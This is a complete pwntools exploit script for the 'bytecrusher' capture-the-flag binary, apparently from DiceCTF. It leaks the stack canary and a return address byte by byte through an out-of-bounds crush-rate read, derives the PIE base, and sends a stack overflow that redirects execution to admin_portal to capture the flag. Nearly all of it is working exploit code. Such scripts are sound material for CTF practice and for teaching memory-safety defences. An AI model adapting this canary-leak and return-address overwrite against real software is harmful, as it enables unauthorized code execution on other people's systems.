#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./bytecrusher')
context.log_level = 'info'

import sys
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'

# Stack layout in free_trial:
#   input_buf at rbp-0x50 (32 bytes)
#   crushed   at rbp-0x30 (32 bytes)
#   canary    at rbp-0x08 (8 bytes)  -> offsets 72-79 from input_buf
#   saved rbp at rbp+0x00 (8 bytes)  -> offsets 80-87
#   ret addr  at rbp+0x08 (8 bytes)  -> offsets 88-95
#
# get_feedback stack:
#   buf at rbp-0x20, canary at rbp-0x08
#   overflow: 24 pad + 8 canary + 8 rbp + 8 ret = 48 bytes
#
# The getchar loop after output_len scanf drains stdin,
# so each iteration is independent (no chaining needed).
#
# Strategy:
#   Iters 0-6: leak canary[1]-canary[7] using rates 73-79
#   Iters 7-12: leak ret[0]-ret[5] using rates 88-93
#   Iters 13-15: unused (just send dummy)
#   get_feedback: overflow to admin_portal

FILL = b'A' * 31  # fills input_buf (31 chars + \n -> fgets stores 31 + \0)

def do_iter(p, rate, output_len):
    """Do one crush iteration. Returns the crushed output bytes."""
    p.recvuntil(b'Enter a string to crush:\n')
    p.sendline(FILL)
    p.recvuntil(b'Enter crush rate:\n')
    p.sendline(str(rate).encode())
    p.recvuntil(b'Enter output length:\n')
    p.sendline(str(output_len).encode())
    p.recvuntil(b'Crushed string:\n')
    line = p.recvline()
    return line.rstrip(b'\n')

def do_dummy(p):
    """Burn an unused iteration."""
    p.recvuntil(b'Enter a string to crush:\n')
    p.sendline(b'hello')
    p.recvuntil(b'Enter crush rate:\n')
    p.sendline(b'1')
    p.recvuntil(b'Enter output length:\n')
    p.sendline(b'5')
    p.recvuntil(b'Crushed string:\n')
    p.recvline()

def exploit():
    if REMOTE:
        p = remote('bytecrusher.chals.dicec.tf', 1337)
    else:
        p = process('./bytecrusher')

    p.recvuntil(b'premium service.\n')

    canary = [0] * 8  # byte 0 is always 0x00
    ret_bytes = [0] * 8

    # Iters 0-6: leak canary[1]-canary[7] with rates 73-79
    # Each rate R: reads input[0]='A', then input[R]=canary[R-72]
    # output_len=3 gives us 2 output bytes (indices 0,1)
    for i in range(7):
        rate = 73 + i
        canary_idx = i + 1
        data = do_iter(p, rate, 3)
        if len(data) >= 2:
            canary[canary_idx] = data[1]
            log.info(f"canary[{canary_idx}] = 0x{canary[canary_idx]:02x}")
        else:
            log.warning(f"canary[{canary_idx}] = 0x00 (null byte stopped read)")
            # If the byte is 0x00, that's what we get (loop stops = null)

    canary_val = u64(bytes(canary))
    log.success(f"Canary: 0x{canary_val:016x}")

    # Iters 7-12: leak ret addr bytes 0-5 with rates 88-93
    # ret addr is at offset 88 from input_buf
    # But first we need to get past saved rbp (offsets 80-87) which may have nulls
    # Rate 88: reads input[0], input[88]=ret[0]
    # Rate 89: reads input[0], input[89]=ret[1]
    # etc.
    for i in range(6):
        rate = 88 + i
        data = do_iter(p, rate, 3)
        if len(data) >= 2:
            ret_bytes[i] = data[1]
            log.info(f"ret[{i}] = 0x{ret_bytes[i]:02x}")
        else:
            log.warning(f"ret[{i}] = 0x00 (null byte stopped read)")

    # Burn remaining iterations 13-15
    for i in range(3):
        do_dummy(p)

    # Calculate PIE base from leaked return address
    # Return from free_trial goes to main+0x6c = base+0x15ec
    leaked_ret = u64(bytes(ret_bytes))
    pie_base = leaked_ret - 0x15ec
    admin_portal = pie_base + 0x12a9
    log.success(f"Leaked ret: 0x{leaked_ret:016x}")
    log.success(f"PIE base:   0x{pie_base:016x}")
    log.success(f"admin_portal: 0x{admin_portal:016x}")

    # get_feedback overflow
    # buf at rbp-0x20, canary at rbp-0x08
    # Layout: [24 bytes pad] [8 bytes canary] [8 bytes saved rbp] [8 bytes ret]
    p.recvuntil(b'Enter some text:\n')
    payload = b'A' * 24
    payload += p64(canary_val)
    payload += p64(0)  # saved rbp (don't care)
    payload += p64(admin_portal)

    if b'\n' in payload:
        log.warning("Payload contains newline byte! This may break gets().")
        # Find which field has the newline
        for off in range(0, len(payload)):
            if payload[off] == 0x0a:
                log.warning(f"  Newline at offset {off}")

    p.sendline(payload)

    response = p.recvall(timeout=5)
    text = response.decode(errors='replace')
    log.info(f"Response: {text}")

    if b'dice{' in response:
        idx = response.index(b'dice{')
        end = response.index(b'}', idx) + 1
        flag = response[idx:end].decode()
        log.success(f"FLAG: {flag}")
        with open('flag.txt', 'w') as f:
            f.write(flag)
        p.close()
        return True

    if 'Welcome dicegang admin' in text:
        log.success("Got admin portal!")
        p.close()
        return True

    if 'stack smashing' in text:
        log.warning("Canary mismatch!")
    elif 'enjoyed it' in text:
        log.info("Normal exit - admin_portal not reached")

    p.close()
    return False

exploit()
